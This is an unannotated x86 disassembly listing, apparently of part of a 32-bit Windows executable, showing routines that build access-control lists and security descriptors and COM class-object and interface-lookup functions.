  402de7:	push   0x20
  402de9:	push   0x2
  402deb:	lea    eax,[esp+0x60]
  402def:	push   eax
  402df0:	call   DWORD PTR ds:0x40e040
  402df6:	test   eax,eax
  402df8:	je     0x403229
  402dfe:	mov    ecx,DWORD PTR [esp+0x26c]
  402e05:	mov    eax,0x10000000
  402e0a:	mov    DWORD PTR [esp+0x10],ecx
  402e0e:	mov    DWORD PTR [esp+0x260],0x2001b
  402e19:	mov    DWORD PTR [esp+0x268],eax
  402e20:	jmp    0x40307b
  402e25:	lea    ecx,[esp+0x25c]
  402e2c:	call   0x403238
  402e31:	push   eax
  402e32:	push   ebx
  402e33:	push   ebx
  402e34:	push   ebx
  402e35:	push   ebx
  402e36:	push   ebx
  402e37:	push   ebx
  402e38:	push   ebx
  402e39:	push   0x12
  402e3b:	xor    esi,esi
  402e3d:	lea    eax,[esp+0x5c]
  402e41:	inc    esi
  402e42:	push   esi
  402e43:	push   eax
  402e44:	call   DWORD PTR ds:0x40e040
  402e4a:	test   eax,eax
  402e4c:	je     0x403229
  402e52:	lea    ecx,[esp+0x264]
  402e59:	call   0x403238
  402e5e:	push   eax
  402e5f:	push   ebx
  402e60:	push   ebx
  402e61:	push   ebx
  402e62:	push   ebx
  402e63:	push   ebx
  402e64:	push   ebx
  402e65:	push   0x220
  402e6a:	push   0x20
  402e6c:	push   0x2
  402e6e:	lea    eax,[esp+0x60]
  402e72:	push   eax
  402e73:	call   DWORD PTR ds:0x40e040
  402e79:	test   eax,eax
  402e7b:	je     0x403229
  402e81:	mov    eax,DWORD PTR [esp+0x25c]
  402e88:	mov    DWORD PTR [esp+0x14],eax
  402e8c:	mov    DWORD PTR [esp+0x260],esi
  402e93:	mov    DWORD PTR [esp+0x268],esi
  402e9a:	mov    ecx,DWORD PTR [esp+0x264]
  402ea1:	mov    DWORD PTR [esp+0x10],ecx
  402ea5:	push   0x2
  402ea7:	jmp    0x403084
  402eac:	lea    ecx,[esp+0x25c]
  402eb3:	call   0x403238
  402eb8:	push   eax
  402eb9:	push   ebx
  402eba:	push   ebx
  402ebb:	push   ebx
  402ebc:	push   ebx
  402ebd:	push   ebx
  402ebe:	push   ebx
  402ebf:	push   ebx
  402ec0:	push   0x12
  402ec2:	push   0x1
  402ec4:	lea    eax,[esp+0x60]
  402ec8:	push   eax
  402ec9:	call   DWORD PTR ds:0x40e040
  402ecf:	test   eax,eax
  402ed1:	je     0x403229
  402ed7:	lea    ecx,[esp+0x264]
  402ede:	call   0x403238
  402ee3:	push   eax
  402ee4:	push   ebx
  402ee5:	push   ebx
  402ee6:	push   ebx
  402ee7:	push   ebx
  402ee8:	push   ebx
  402ee9:	push   ebx
  402eea:	push   0x220
  402eef:	push   0x20
  402ef1:	push   0x2
  402ef3:	lea    eax,[esp+0x60]
  402ef7:	push   eax
  402ef8:	call   DWORD PTR ds:0x40e040
  402efe:	test   eax,eax
  402f00:	je     0x403229
  402f06:	lea    ecx,[esp+0x26c]
  402f0d:	call   0x403238
  402f12:	push   eax
  402f13:	push   ebx
  402f14:	push   ebx
  402f15:	push   ebx
  402f16:	push   ebx
  402f17:	push   ebx
  402f18:	push   ebx
  402f19:	push   ebx
  402f1a:	push   edi
  402f1b:	push   0x1
  402f1d:	lea    eax,[esp+0x60]
  402f21:	push   eax
  402f22:	call   DWORD PTR ds:0x40e040
  402f28:	test   eax,eax
  402f2a:	je     0x403229
  402f30:	mov    ecx,DWORD PTR [esp+0x264]
  402f37:	mov    eax,DWORD PTR [esp+0x25c]
  402f3e:	mov    DWORD PTR [esp+0x10],ecx
  402f42:	xor    ecx,ecx
  402f44:	inc    ecx
  402f45:	mov    DWORD PTR [esp+0x14],eax
  402f49:	mov    DWORD PTR [esp+0x260],ecx
  402f50:	mov    DWORD PTR [esp+0x268],ecx
  402f57:	mov    DWORD PTR [esp+0x270],ecx
  402f5e:	jmp    0x403082
  402f63:	lea    ecx,[esp+0x25c]
  402f6a:	call   0x403238
  402f6f:	push   eax
  402f70:	push   ebx
  402f71:	push   ebx
  402f72:	push   ebx
  402f73:	push   ebx
  402f74:	push   ebx
  402f75:	push   ebx
  402f76:	push   ebx
  402f77:	push   0x12
  402f79:	push   0x1
  402f7b:	lea    eax,[esp+0x60]
  402f7f:	push   eax
  402f80:	call   DWORD PTR ds:0x40e040
  402f86:	test   eax,eax
  402f88:	je     0x403229
  402f8e:	lea    ecx,[esp+0x264]
  402f95:	call   0x403238
  402f9a:	push   eax
  402f9b:	push   ebx
  402f9c:	push   ebx
  402f9d:	push   ebx
  402f9e:	push   ebx
  402f9f:	push   ebx
  402fa0:	push   ebx
  402fa1:	push   0x220
  402fa6:	push   0x20
  402fa8:	push   0x2
  402faa:	lea    eax,[esp+0x60]
  402fae:	push   eax
  402faf:	call   DWORD PTR ds:0x40e040
  402fb5:	test   eax,eax
  402fb7:	je     0x403229
  402fbd:	mov    eax,0x1effff
  402fc2:	mov    DWORD PTR [esp+0x260],eax
  402fc9:	mov    DWORD PTR [esp+0x268],eax
  402fd0:	jmp    0x402e9a
  402fd5:	lea    ecx,[esp+0x25c]
  402fdc:	call   0x403238
  402fe1:	push   eax
  402fe2:	push   ebx
  402fe3:	push   ebx
  402fe4:	push   ebx
  402fe5:	push   ebx
  402fe6:	push   ebx
  402fe7:	push   ebx
  402fe8:	push   ebx
  402fe9:	push   0x12
  402feb:	push   0x1
  402fed:	lea    eax,[esp+0x60]
  402ff1:	push   eax
  402ff2:	call   DWORD PTR ds:0x40e040
  402ff8:	test   eax,eax
  402ffa:	je     0x403229
  403000:	lea    ecx,[esp+0x264]
  403007:	call   0x403238
  40300c:	push   eax
  40300d:	push   ebx
  40300e:	push   ebx
  40300f:	push   ebx
  403010:	push   ebx
  403011:	push   ebx
  403012:	push   ebx
  403013:	push   ebx
  403014:	push   ebx
  403015:	push   0x1
  403017:	lea    eax,[esp+0x68]
  40301b:	push   eax
  40301c:	call   DWORD PTR ds:0x40e040
  403022:	test   eax,eax
  403024:	je     0x403229
  40302a:	lea    ecx,[esp+0x26c]
  403031:	call   0x403238
  403036:	push   eax
  403037:	push   ebx
  403038:	push   ebx
  403039:	push   ebx
  40303a:	push   ebx
  40303b:	push   ebx
  40303c:	push   ebx
  40303d:	push   0x220
  403042:	push   0x20
  403044:	push   0x2
  403046:	lea    eax,[esp+0x60]
  40304a:	push   eax
  40304b:	call   DWORD PTR ds:0x40e040
  403051:	test   eax,eax
  403053:	je     0x403229
  403059:	mov    eax,DWORD PTR [esp+0x26c]
  403060:	mov    DWORD PTR [esp+0x10],eax
  403064:	mov    eax,0x1effff
  403069:	mov    DWORD PTR [esp+0x260],eax
  403070:	mov    DWORD PTR [esp+0x268],0xa0120000
  40307b:	mov    DWORD PTR [esp+0x270],eax
  403082:	push   0x3
  403084:	pop    esi
  403085:	push   0x8
  403087:	pop    edi
  403088:	test   esi,esi
  40308a:	jle    0x4030a5
  40308c:	push   DWORD PTR [esp+ebx*8+0x25c]
  403093:	call   DWORD PTR ds:0x40e064
  403099:	add    edi,0x8
  40309c:	add    edi,eax
  40309e:	inc    ebx
  40309f:	cmp    ebx,esi
  4030a1:	jl     0x40308c
  4030a3:	xor    ebx,ebx
  4030a5:	push   0x200
  4030aa:	lea    eax,[esp+0x58]
  4030ae:	push   ebx
  4030af:	push   eax
  4030b0:	call   0x409b76
  4030b5:	mov    ecx,0x200
  4030ba:	lea    eax,[esp+0x60]
  4030be:	add    esp,0xc
  4030c1:	mov    DWORD PTR [esp+0x4c],ecx
  4030c5:	mov    DWORD PTR [esp+0x48],eax
  4030c9:	cmp    edi,ecx
  4030cb:	jle    0x4030f0
  4030cd:	push   edi
  4030ce:	push   ebx
  4030cf:	call   DWORD PTR ds:0x40e0b4
  4030d5:	mov    ecx,eax
  4030d7:	mov    DWORD PTR [esp+0x48],eax
  4030db:	neg    eax
  4030dd:	sbb    eax,eax
  4030df:	and    eax,edi
  4030e1:	mov    DWORD PTR [esp+0x4c],eax
  4030e5:	test   ecx,ecx
  4030e7:	jne    0x4030f0
  4030e9:	push   0xe
  4030eb:	jmp    0x4031bb
  4030f0:	push   0x2
  4030f2:	push   edi
  4030f3:	push   DWORD PTR [esp+0x50]
  4030f7:	call   DWORD PTR ds:0x40e03c
  4030fd:	test   eax,eax
  4030ff:	je     0x4031d2
  403105:	mov    edi,ebx
  403107:	test   esi,esi
  403109:	jle    0x403152
  40310b:	push   DWORD PTR [esp+edi*8+0x25c]
  403112:	push   DWORD PTR [esp+edi*8+0x264]
  403119:	push   0x2
  40311b:	push   DWORD PTR [esp+0x54]
  40311f:	call   DWORD PTR ds:0x40e04c
  403125:	test   eax,eax
  403127:	je     0x4031d2
  40312d:	lea    eax,[esp+0x18]
  403131:	push   eax
  403132:	push   edi
  403133:	push   DWORD PTR [esp+0x50]
  403137:	call   DWORD PTR ds:0x40e030
  40313d:	test   eax,eax
  40313f:	je     0x4031d2
  403145:	mov    eax,DWORD PTR [esp+0x18]
  403149:	inc    edi
  40314a:	mov    BYTE PTR [eax+0x1],0x3
  40314e:	cmp    edi,esi
  403150:	jl     0x40310b
  403152:	push   0x1
  403154:	lea    eax,[esp+0x28]
  403158:	push   eax
  403159:	call   DWORD PTR ds:0x40e024
  40315f:	test   eax,eax
  403161:	je     0x4031d2
  403163:	push   ebx
  403164:	push   DWORD PTR [esp+0x4c]
  403168:	lea    eax,[esp+0x2c]
  40316c:	push   0x1
  40316e:	push   eax
  40316f:	call   DWORD PTR ds:0x40e028
  403175:	test   eax,eax
  403177:	je     0x4031d2
  403179:	push   ebx
  40317a:	push   DWORD PTR [esp+0x14]
  40317e:	lea    eax,[esp+0x2c]
  403182:	push   eax
  403183:	call   DWORD PTR ds:0x40e048
  403189:	test   eax,eax
  40318b:	je     0x4031d2
  40318d:	mov    eax,DWORD PTR [esp+0x14]
  403191:	test   eax,eax
  403193:	je     0x4031a6
  403195:	push   ebx
  403196:	push   eax
  403197:	lea    eax,[esp+0x2c]
  40319b:	push   eax
  40319c:	call   DWORD PTR ds:0x40e010
  4031a2:	test   eax,eax
  4031a4:	je     0x4031d2
  4031a6:	lea    eax,[esp+0x24]
  4031aa:	push   eax
  4031ab:	call   DWORD PTR ds:0x40e034
  4031b1:	mov    ecx,DWORD PTR [esp+0x20]
  4031b5:	cmp    DWORD PTR [ecx],eax
  4031b7:	jae    0x4031be
  4031b9:	push   0x7a
  4031bb:	pop    ebx
  4031bc:	jmp    0x4031da
  4031be:	push   ecx
  4031bf:	push   DWORD PTR [esp+0x20]
  4031c3:	lea    eax,[esp+0x2c]
  4031c7:	push   eax
  4031c8:	call   DWORD PTR ds:0x40e05c
  4031ce:	test   eax,eax
  4031d0:	jne    0x4031da
  4031d2:	call   DWORD PTR ds:0x40e0f4
  4031d8:	mov    ebx,eax
  4031da:	cmp    DWORD PTR [esp+0x4c],0x200
  4031e2:	jle    0x4031f3
  4031e4:	mov    ecx,DWORD PTR [esp+0x48]
  4031e8:	test   ecx,ecx
  4031ea:	je     0x4031f3
  4031ec:	push   ecx
  4031ed:	call   DWORD PTR ds:0x40e104
  4031f3:	push   0x4
  4031f5:	pop    edi
  4031f6:	lea    esi,[esp+0x284]
  4031fd:	lea    esi,[esi-0x8]
  403200:	cmp    DWORD PTR [esi],0x0
  403203:	je     0x40320d
  403205:	push   DWORD PTR [esi]
  403207:	call   DWORD PTR ds:0x40e054
  40320d:	sub    edi,0x1
  403210:	jns    0x4031fd
  403212:	mov    ecx,DWORD PTR [esp+0x284]
  403219:	mov    eax,ebx
  40321b:	pop    edi
  40321c:	pop    esi
  40321d:	pop    ebx
  40321e:	xor    ecx,esp
  403220:	call   0x409090
  403225:	mov    esp,ebp
  403227:	pop    ebp
  403228:	ret    
  403229:	call   DWORD PTR ds:0x40e0f4
  40322f:	mov    ebx,eax
  403231:	jmp    0x4031f6
  403233:	int3   
  403234:	int3   
  403235:	int3   
  403236:	int3   
  403237:	int3   
  403238:	mov    edi,edi
  40323a:	push   esi
  40323b:	mov    esi,ecx
  40323d:	cmp    DWORD PTR [esi],0x0
  403240:	je     0x40324a
  403242:	push   DWORD PTR [esi]
  403244:	call   DWORD PTR ds:0x40e054
  40324a:	mov    eax,esi
  40324c:	pop    esi
  40324d:	ret    
  40324e:	int3   
  40324f:	int3   
  403250:	int3   
  403251:	int3   
  403252:	int3   
  403253:	mov    edi,edi
  403255:	push   ebp
  403256:	mov    ebp,esp
  403258:	and    esp,0xfffffff8
  40325b:	push   ecx
  40325c:	cmp    BYTE PTR ds:0x40c428,0x0
  403263:	push   ebx
  403264:	push   esi
  403265:	push   edi
  403266:	mov    esi,edx
  403268:	mov    edi,ecx
  40326a:	mov    ebx,0x40cee0
  40326f:	jne    0x40328d
  403271:	push   ecx
  403272:	push   0x1
  403274:	mov    edx,0x40b030
  403279:	mov    ecx,ebx
  40327b:	call   0x402bcb
  403280:	pop    ecx
  403281:	pop    ecx
  403282:	test   eax,eax
  403284:	jne    0x403298
  403286:	mov    BYTE PTR ds:0x40c428,0x1
  40328d:	mov    DWORD PTR [edi],ebx
  40328f:	mov    eax,ds:0x40b030
  403294:	mov    DWORD PTR [esi],eax
  403296:	xor    eax,eax
  403298:	pop    edi
  403299:	pop    esi
  40329a:	pop    ebx
  40329b:	mov    esp,ebp
  40329d:	pop    ebp
  40329e:	ret    
  40329f:	int3   
  4032a0:	int3   
  4032a1:	int3   
  4032a2:	int3   
  4032a3:	int3   
  4032a4:	mov    edi,edi
  4032a6:	push   ebp
  4032a7:	mov    ebp,esp
  4032a9:	sub    esp,0x84
  4032af:	mov    eax,ds:0x40b000
  4032b4:	xor    eax,ebp
  4032b6:	mov    DWORD PTR [ebp-0x4],eax
  4032b9:	push   0x40
  4032bb:	lea    eax,[ebp-0x84]
  4032c1:	mov    BYTE PTR ds:0x40cbb1,0x1
  4032c8:	push   eax
  4032c9:	push   0x40121c
  4032ce:	call   DWORD PTR ds:0x40e080
  4032d4:	test   eax,eax
  4032d6:	jne    0x4032dc
  4032d8:	xor    al,al
  4032da:	jmp    0x40330b
  4032dc:	movzx  eax,WORD PTR [ebp-0x84]
  4032e3:	lea    edx,[ebp-0x84]
  4032e9:	test   eax,eax
  4032eb:	je     0x403309
  4032ed:	mov    ecx,DWORD PTR ds:0x40cdb8
  4032f3:	and    eax,0x1f
  4032f6:	lea    edx,[edx+0x2]
  4032f9:	bts    ecx,eax
  4032fc:	movzx  eax,WORD PTR [edx]
  4032ff:	test   eax,eax
  403301:	jne    0x4032f3
  403303:	mov    DWORD PTR ds:0x40cdb8,ecx
  403309:	mov    al,0x1
  40330b:	mov    ecx,DWORD PTR [ebp-0x4]
  40330e:	xor    ecx,ebp
  403310:	call   0x409090
  403315:	mov    esp,ebp
  403317:	pop    ebp
  403318:	ret    
  403319:	int3   
  40331a:	int3   
  40331b:	int3   
  40331c:	int3   
  40331d:	int3   
  40331e:	int3   
  40331f:	int3   
  403320:	mov    edi,edi
  403322:	push   ebp
  403323:	mov    ebp,esp
  403325:	mov    edx,DWORD PTR [ebp+0xc]
  403328:	xor    ecx,ecx
  40332a:	push   esi
  40332b:	mov    esi,0x401fec
  403330:	mov    eax,DWORD PTR [edx+ecx*4]
  403333:	cmp    eax,DWORD PTR [esi+ecx*4]
  403336:	jne    0x403340
  403338:	inc    ecx
  403339:	cmp    ecx,0x4
  40333c:	jne    0x403330
  40333e:	jmp    0x403355
  403340:	mov    esi,0x40200c
  403345:	xor    ecx,ecx
  403347:	mov    eax,DWORD PTR [edx+ecx*4]
  40334a:	cmp    eax,DWORD PTR [esi+ecx*4]
  40334d:	jne    0x403361
  40334f:	inc    ecx
  403350:	cmp    ecx,0x4
  403353:	jne    0x403347
  403355:	mov    eax,DWORD PTR [ebp+0x10]
  403358:	mov    ecx,DWORD PTR [ebp+0x8]
  40335b:	mov    DWORD PTR [eax],ecx
  40335d:	xor    eax,eax
  40335f:	jmp    0x40336c
  403361:	mov    eax,DWORD PTR [ebp+0x10]
  403364:	and    DWORD PTR [eax],0x0
  403367:	mov    eax,0x80004002
  40336c:	pop    esi
  40336d:	pop    ebp
  40336e:	ret    0xc
  403371:	int3   
  403372:	int3   
  403373:	int3   
  403374:	int3   
  403375:	int3   
  403376:	int3   
  403377:	int3   
  403378:	int3   
  403379:	int3   
  40337a:	int3   
  40337b:	int3   
  40337c:	int3   
  40337d:	int3   
  40337e:	int3   
  40337f:	int3   
  403380:	xor    eax,eax
  403382:	inc    eax
  403383:	ret    0x4
  403386:	int3   
  403387:	int3   
  403388:	int3   
  403389:	int3   
  40338a:	int3   
  40338b:	int3   
  40338c:	int3   
  40338d:	int3   
  40338e:	int3   
  40338f:	int3   
  403390:	mov    edi,edi
  403392:	push   ebp
  403393:	mov    ebp,esp
  403395:	sub    esp,0xc
  403398:	mov    eax,ds:0x40b000
  40339d:	xor    eax,ebp
  40339f:	mov    DWORD PTR [ebp-0x4],eax
  4033a2:	push   ebx
  4033a3:	mov    ebx,DWORD PTR [ebp+0x8]
  4033a6:	sub    ebx,0x40b8bc
  4033ac:	push   edi
  4033ad:	mov    edi,DWORD PTR [ebp+0x14]
  4033b0:	sar    ebx,0x2
  4033b3:	test   edi,edi
  4033b5:	jne    0x4033c1
  4033b7:	mov    eax,0x80070057
  4033bc:	jmp    0x4034c9
  4033c1:	and    DWORD PTR [edi],0x0
  4033c4:	cmp    DWORD PTR [ebp+0xc],0x0
  4033c8:	je     0x4033d4
  4033ca:	mov    eax,0x80040110
  4033cf:	jmp    0x4034c9
  4033d4:	push   esi
  4033d5:	mov    esi,DWORD PTR [ebp+0x10]
  4033d8:	mov    edx,0x401fec
  4033dd:	xor    ecx,ecx
  4033df:	mov    eax,DWORD PTR [esi+ecx*4]
  4033e2:	cmp    eax,DWORD PTR [edx+ecx*4]
  4033e5:	jne    0x4033ef
  4033e7:	inc    ecx
  4033e8:	cmp    ecx,0x4
  4033eb:	jne    0x4033df
  4033ed:	jmp    0x40340e
  4033ef:	mov    edx,ebx
  4033f1:	shl    edx,0x4
  4033f4:	add    edx,0x402078
  4033fa:	xor    ecx,ecx
  4033fc:	mov    eax,DWORD PTR [esi+ecx*4]
  4033ff:	cmp    eax,DWORD PTR [edx+ecx*4]
  403402:	jne    0x4034c3
  403408:	inc    ecx
  403409:	cmp    ecx,0x4
  40340c:	jne    0x4033fc
  40340e:	lock inc DWORD PTR ds:0x40cba4
  403415:	cmp    BYTE PTR ds:0x40c420,0x0
  40341c:	jne    0x40344d
  40341e:	mov    eax,ds:0x40cc10
  403423:	test   eax,eax
  403425:	je     0x40345e
  403427:	mov    esi,DWORD PTR ds:0x40b054
  40342d:	mov    ecx,esi
  40342f:	push   eax
  403430:	call   DWORD PTR ds:0x40e20c
  403436:	call   esi
  403438:	push   0x0
  40343a:	push   DWORD PTR ds:0x40cc10
  403440:	call   DWORD PTR ds:0x40e094
  403446:	cmp    eax,0x102
  40344b:	je     0x40345e
  40344d:	and    DWORD PTR [edi],0x0
  403450:	lock dec DWORD PTR ds:0x40cba4
  403457:	mov    eax,0x80080008
  40345c:	jmp    0x4034c8
  40345e:	mov    esi,DWORD PTR [ebx*4+0x401fdc]
  403465:	mov    ecx,esi
  403467:	call   DWORD PTR ds:0x40e20c
  40346d:	call   esi
  40346f:	mov    DWORD PTR [edi],eax
  403471:	lock dec DWORD PTR ds:0x40cba4
  403478:	xor    ebx,ebx
  40347a:	cmp    DWORD PTR [edi],ebx
  40347c:	jne    0x4034bf
  40347e:	cmp    DWORD PTR ds:0x40cc10,ebx
  403484:	je     0x4034b8
  403486:	call   0x405514
  40348b:	test   eax,eax
  40348d:	je     0x4034b8
  40348f:	mov    esi,DWORD PTR ds:0x40b058
  403495:	lea    eax,[ebp-0xc]
  403498:	or     DWORD PTR [ebp-0x8],0xffffffff
  40349c:	mov    ecx,esi
  40349e:	push   ebx
  40349f:	push   ebx
  4034a0:	push   ebx
  4034a1:	push   ebx
  4034a2:	push   eax
  4034a3:	push   DWORD PTR ds:0x40cc10
  4034a9:	mov    DWORD PTR [ebp-0xc],0x4d2fa200
  4034b0:	call   DWORD PTR ds:0x40e20c
  4034b6:	call   esi
  4034b8:	mov    eax,0x8007000e
  4034bd:	jmp    0x4034c8
  4034bf:	xor    eax,eax
  4034c1:	jmp    0x4034c8
  4034c3:	mov    eax,0x80004002
  4034c8:	pop    esi
  4034c9:	mov    ecx,DWORD PTR [ebp-0x4]
  4034cc:	pop    edi
  4034cd:	xor    ecx,ebp
  4034cf:	pop    ebx
  4034d0:	call   0x409090
  4034d5:	mov    esp,ebp
  4034d7:	pop    ebp
  4034d8:	ret    0x10
  4034db:	int3   
  4034dc:	int3   
  4034dd:	int3   
  4034de:	int3   
  4034df:	int3   
  4034e0:	mov    edi,edi
  4034e2:	push   ebp
  4034e3:	mov    ebp,esp
  4034e5:	cmp    DWORD PTR [ebp+0xc],0x0
  4034e9:	je     0x4034f4
  4034eb:	lock inc DWORD PTR ds:0x40cba4
  4034f2:	jmp    0x40352e
  4034f4:	cmp    DWORD PTR ds:0x40cba4,0x0
  4034fb:	je     0x40352e
  4034fd:	lock dec DWORD PTR ds:0x40cba4
  403504:	cmp    DWORD PTR ds:0x40cc2c,0x0
  40350b:	je     0x40351e
  40350d:	cmp    DWORD PTR ds:0x40cba4,0x0
  403514:	jne    0x40351e
  403516:	push   0x0
  403518:	call   DWORD PTR ds:0x40e168
  40351e:	push   ecx
  40351f:	push   0x0
  403521:	push   0x0
  403523:	push   DWORD PTR ds:0x40cb7c
  403529:	call   0x403539
  40352e:	xor    eax,eax
  403530:	pop    ebp
  403531:	ret    0x8
  403534:	int3   
  403535:	int3   
  403536:	int3   
  403537:	int3   
  403538:	int3   
  403539:	mov    edi,edi
  40353b:	push   ebp
  40353c:	mov    ebp,esp
  40353e:	push   esi
  40353f:	push   edi
  403540:	mov    edi,0x40cb60
  403545:	push   edi
  403546:	call   DWORD PTR ds:0x40e100
  40354c:	cmp    DWORD PTR ds:0x40cb7c,0x1
  403553:	jne    0x40355c
  403555:	xor    esi,esi
  403557:	jmp    0x4035f3
  40355c:	and    DWORD PTR ds:0x40cb80,0x0
  403563:	mov    esi,DWORD PTR [ebp+0x8]
  403566:	cmp    esi,0x2
  403569:	je     0x403591
  40356b:	cmp    DWORD PTR ds:0x40cba4,0x0
  403572:	jg     0x403587
  403574:	call   0x405514
  403579:	mov    DWORD PTR ds:0x40cb80,0x5
  403583:	test   eax,eax
  403585:	jne    0x403591
  403587:	mov    DWORD PTR ds:0x40cb80,0x4
  403591:	mov    eax,DWORD PTR [ebp+0xc]
  403594:	mov    ds:0x40cb84,eax
  403599:	mov    eax,DWORD PTR [ebp+0x10]
  40359c:	mov    DWORD PTR ds:0x40cb7c,esi
  4035a2:	mov    ds:0x40cb90,eax
  4035a7:	cmp    esi,0x4
  4035aa:	je     0x4035c3
  4035ac:	cmp    esi,0x1
  4035af:	je     0x4035c3
  4035b1:	mov    eax,ds:0x40b03c
  4035b6:	mov    ds:0x40cb8c,eax
  4035bb:	inc    eax
  4035bc:	mov    ds:0x40b03c,eax
  4035c1:	jmp    0x4035ca
  4035c3:	and    DWORD PTR ds:0x40cb8c,0x0
  4035ca:	push   0x40cb78
  4035cf:	push   DWORD PTR ds:0x40cb94
  4035d5:	call   DWORD PTR ds:0x40e044
  4035db:	mov    esi,eax
  4035dd:	test   esi,esi
  4035df:	jne    0x4035f3
  4035e1:	call   DWORD PTR ds:0x40e0f4
  4035e7:	mov    edx,eax
  4035e9:	mov    ecx,0x401230
  4035ee:	call   0x4053b7
  4035f3:	push   edi
  4035f4:	call   DWORD PTR ds:0x40e0d4
  4035fa:	pop    edi
  4035fb:	mov    eax,esi
  4035fd:	pop    esi
  4035fe:	pop    ebp
  4035ff:	ret    0x10
  403602:	int3   
  403603:	int3   
  403604:	int3   
  403605:	int3   
  403606:	int3   
  403607:	int3   
  403608:	int3   
  403609:	int3   
  40360a:	int3   
  40360b:	int3   
  40360c:	int3   
  40360d:	int3   
  40360e:	int3   
  40360f:	int3   
  403610:	mov    edi,edi
  403612:	push   ebp
  403613:	mov    ebp,esp
  403615:	sub    esp,0xc
  403618:	mov    eax,ds:0x40b000
  40361d:	xor    eax,ebp
  40361f:	mov    DWORD PTR [ebp-0x4],eax
  403622:	mov    eax,ds:0x40cb98
  403627:	push   esi
  403628:	push   edi
  403629:	xor    edi,edi
  40362b:	mov    DWORD PTR [ebp-0x8],edi
  40362e:	mov    DWORD PTR [ebp-0xc],edi
  403631:	test   eax,eax
  403633:	jne    0x403649
  403635:	push   0x4012b0
  40363a:	call   DWORD PTR ds:0x40e0bc
  403640:	mov    ds:0x40cb98,eax
  403645:	test   eax,eax
  403647:	je     0x40365b
  403649:	push   0x4012c0
  40364e:	push   eax
  40364f:	call   DWORD PTR ds:0x40e0fc
  403655:	mov    esi,eax
  403657:	test   esi,esi
  403659:	jne    0x403662
  40365b:	xor    eax,eax
  40365d:	jmp    0x40371c
  403662:	push   ebx
  403663:	lea    eax,[ebp-0xc]
  403666:	mov    ebx,0x4020bc
  40366b:	push   eax
  40366c:	push   0x401fec
  403671:	push   ebx
  403672:	mov    ecx,esi
  403674:	call   DWORD PTR ds:0x40e20c
  40367a:	call   esi
  40367c:	test   eax,eax
  40367e:	jne    0x4036b2
  403680:	mov    eax,DWORD PTR [ebp-0xc]
  403683:	lea    ecx,[ebp-0x8]
  403686:	push   ecx
  403687:	push   ebx
  403688:	push   edi
  403689:	mov    esi,DWORD PTR [eax]
  40368b:	push   eax
  40368c:	mov    ecx,DWORD PTR [esi+0xc]
  40368f:	call   DWORD PTR ds:0x40e20c
  403695:	call   DWORD PTR [esi+0xc]
  403698:	mov    eax,DWORD PTR [ebp-0xc]
  40369b:	push   eax
  40369c:	mov    ecx,DWORD PTR [eax]
  40369e:	mov    esi,DWORD PTR [ecx+0x8]
  4036a1:	mov    ecx,esi
  4036a3:	call   DWORD PTR ds:0x40e20c
  4036a9:	call   esi
  4036ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4036ae:	test   ecx,ecx
  4036b0:	jne    0x4036b6
  4036b2:	xor    eax,eax
  4036b4:	jmp    0x40371b
  4036b6:	mov    eax,DWORD PTR [ecx]
  4036b8:	push   ecx
  4036b9:	mov    esi,DWORD PTR [eax+0x74]
  4036bc:	mov    ecx,esi
  4036be:	call   DWORD PTR ds:0x40e20c
  4036c4:	call   esi
  4036c6:	mov    ecx,DWORD PTR [ebp-0x8]
  4036c9:	mov    edi,eax
  4036cb:	push   0x40c7b0
  4036d0:	push   0x40cd70
  4036d5:	push   0x40cc1c
  4036da:	mov    esi,DWORD PTR [ecx]
  4036dc:	push   0x40cc10
  4036e1:	push   ecx
  4036e2:	mov    esi,DWORD PTR [esi+0xc0]
  4036e8:	mov    ecx,esi
  4036ea:	call   DWORD PTR ds:0x40e20c
  4036f0:	call   esi
  4036f2:	mov    eax,DWORD PTR [ebp-0x8]
  4036f5:	push   eax
  4036f6:	mov    ecx,DWORD PTR [eax]
  4036f8:	mov    esi,DWORD PTR [ecx+0xc8]
  4036fe:	mov    ecx,esi
  403700:	call   DWORD PTR ds:0x40e20c
  403706:	call   esi
  403708:	mov    eax,DWORD PTR [edi]
  40370a:	push   edi
  40370b:	mov    esi,DWORD PTR [eax+0x8]
  40370e:	mov    ecx,esi
  403710:	call   DWORD PTR ds:0x40e20c
  403716:	call   esi
  403718:	mov    eax,DWORD PTR [ebp-0x8]
  40371b:	pop    ebx
  40371c:	mov    ecx,DWORD PTR [ebp-0x4]
  40371f:	pop    edi
  403720:	xor    ecx,ebp
  403722:	pop    esi
  403723:	call   0x409090
  403728:	mov    esp,ebp
  40372a:	pop    ebp
  40372b:	ret    
  40372c:	int3   
  40372d:	int3   
  40372e:	int3   
  40372f:	int3   
  403730:	int3   
  403731:	mov    edi,edi
  403733:	push   ebp
  403734:	mov    ebp,esp
  403736:	sub    esp,0xc
  403739:	mov    eax,ds:0x40b000
  40373e:	xor    eax,ebp
  403740:	mov    DWORD PTR [ebp-0x4],eax
  403743:	and    DWORD PTR [ebp-0xc],0x0
  403747:	and    DWORD PTR [ebp-0x8],0x0
  40374b:	mov    eax,ds:0x40cb98
  403750:	push   esi
  403751:	test   eax,eax
  403753:	jne    0x403769
  403755:	push   0x4012b0
  40375a:	call   DWORD PTR ds:0x40e0bc
  403760:	mov    ds:0x40cb98,eax
  403765:	test   eax,eax
  403767:	je     0x40377b
  403769:	push   0x4012c0
  40376e:	push   eax
  40376f:	call   DWORD PTR ds:0x40e0fc
  403775:	mov    esi,eax
  403777:	test   esi,esi
  403779:	jne    0x40377f
  40377b:	xor    eax,eax
  40377d:	jmp    0x4037d1
  40377f:	push   ebx
  403780:	lea    eax,[ebp-0x8]
  403783:	mov    ebx,0x401f24
  403788:	push   eax
  403789:	push   0x401fec
  40378e:	push   ebx
  40378f:	mov    ecx,esi
  403791:	call   DWORD PTR ds:0x40e20c
  403797:	call   esi
  403799:	test   eax,eax
  40379b:	je     0x4037a1
  40379d:	xor    eax,eax
  40379f:	jmp    0x4037d0
  4037a1:	mov    eax,DWORD PTR [ebp-0x8]
  4037a4:	lea    ecx,[ebp-0xc]
  4037a7:	push   ecx
  4037a8:	push   ebx
  4037a9:	push   0x0
  4037ab:	mov    esi,DWORD PTR [eax]
  4037ad:	push   eax
  4037ae:	mov    ecx,DWORD PTR [esi+0xc]
  4037b1:	call   DWORD PTR ds:0x40e20c
  4037b7:	call   DWORD PTR [esi+0xc]
  4037ba:	mov    eax,DWORD PTR [ebp-0x8]
  4037bd:	push   eax
  4037be:	mov    ecx,DWORD PTR [eax]
  4037c0:	mov    esi,DWORD PTR [ecx+0x8]
  4037c3:	mov    ecx,esi
  4037c5:	call   DWORD PTR ds:0x40e20c
